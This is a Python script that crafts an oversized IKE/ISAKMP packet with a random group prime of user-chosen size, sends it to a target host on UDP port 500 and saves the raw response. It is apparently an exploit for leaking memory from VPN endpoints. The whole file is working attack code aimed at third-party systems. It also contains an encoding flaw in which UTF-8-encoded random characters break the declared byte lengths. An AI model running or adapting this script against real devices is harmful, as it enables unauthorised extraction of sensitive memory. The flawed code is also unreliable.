#!/usr/bin/env python
import argparse
import socket
import binascii
from struct import pack
import random

def makeInitiatorSPI():
	initiatorSPI = ''.join([chr(random.randint(0, 255)) for n in range(8)])
	return bytearray(initiatorSPI, 'utf-8')

def makeGroupPrime(bits):
    groupPrime = ''.join([chr(random.randint(0, 255)) for n in range(bits // 8)])
    return groupPrime

def makePacket(length):
	groupPrime = makeGroupPrime(length)
	groupPrimeLen = len(groupPrime)

	pkt = makeInitiatorSPI()
	
	pkt += b'\x00\x00\x00\x00\x00\x00\x00\x00'
	pkt += b'\x01\x10\x02\x00\x00\x00\x00\x00'
	pkt += b'\x00\x00'
	
	pkt += pack('>H', groupPrimeLen + 92)
	pkt += b'\x00\x00'
	
	pkt += pack('>H', groupPrimeLen + 64)
	pkt += b'\x00\x00\x00\x01\x00\x00\x00\x01'
	pkt += b'\x00\x00'

	pkt += pack('>H', groupPrimeLen + 52)
	pkt += b'\x01\x01\x04\x01\x2e\xbf\x19\x3c'
	pkt += b'\x00\x00'

	pkt += pack('>H', groupPrimeLen + 40)
	pkt += b'\x01\x01\x00\x00\x80\x01\x00\x06'
	pkt += b'\x80\x0b\x00\x01\x00\x0c\x00\x04'
	pkt += b'\x00\x20\xc4\x9b\x80\x02\x00\x02'
	pkt += b'\x80\x04\x00\x01\x00\x06'
	pkt += pack('>H', groupPrimeLen)
	pkt += bytes(groupPrime, 'utf-8')
	pkt += b'\x80\x03\x00\x01'

	print("{}\n".format(pkt))
	return pkt

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('host', help='the target host name/IP')
	parser.add_argument('-p', '--port', type=int, default=500, help='target host port')
	parser.add_argument('-n', '--numbits', type=int, default=19488, help='size in bits of group prime (try 800 < n < 136416')
	parser.add_argument('-o', '--outfile', default='dump.bin', help='file to store the response in')
	parser.add_argument('-i', '--infile', default='send.bin', help='file to store what we send to the sever')
	args = parser.parse_args()

	out = open(args.outfile, 'wb')
	infile = open(args.infile, 'wb')

	fd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	fd.bind(('', 500))
	fd.connect((args.host, args.port))

	payload = makePacket(args.numbits)
	fd.send(payload)
	r = fd.recv(4096*16)
	print(r)
	infile.write(payload)
	infile.close()
	out.write(r)
	out.close()

	print ('[+] Response saved in {} - and send request {}'.format(args.outfile,args.infile))

if __name__ == '__main__':
	main()
